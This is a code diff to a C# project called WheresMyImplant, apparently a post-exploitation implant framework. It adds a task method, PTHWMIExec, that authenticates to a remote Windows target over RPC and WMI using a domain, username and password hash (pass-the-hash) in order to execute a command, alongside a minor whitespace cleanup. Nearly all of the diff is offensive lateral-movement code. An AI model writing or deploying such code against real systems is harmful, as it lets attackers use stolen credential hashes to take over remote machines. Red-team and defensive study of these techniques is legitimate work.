@@ -119,8 +119,6 @@ namespace WheresMyImplant
             return tokenvator.GetOutput();
         }
 
-        
-
         //FormalChicken
         public static void StartSmbServer(String pipeName)
         {
@@ -285,6 +283,41 @@ namespace WheresMyImplant
                     else
                     {
                         output.Append("[-] Login Failed");
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                output.Append(ex.ToString());
+            }
+            return output.ToString();
+        }
+
+        [ManagementTask]
+        public static String PTHWMIExec(String target, String command, String domain, String username, String hash)
+        {
+            StringBuilder output = new StringBuilder();
+            try
+            {
+                using (WMIExec wmiExec = new WMIExec())
+                {
+                    if (wmiExec.ConnectInitiator(target))
+                    {
+                        wmiExec.InitiateRPC();
+                    }
+
+                    if (wmiExec.ConnectWMI())
+                    {
+                        wmiExec.RPCBind();
+                        wmiExec.Authenticate(domain, username, hash);
+                        wmiExec.Activator();
+                    }
+
+                    if (wmiExec.ConnectRandom())
+                    {
+                        wmiExec.RPCBindRandom();
+                        wmiExec.AuthenticateRandom(domain, username, hash);
+                        wmiExec.QueryInterface();
                     }
                 }
             }
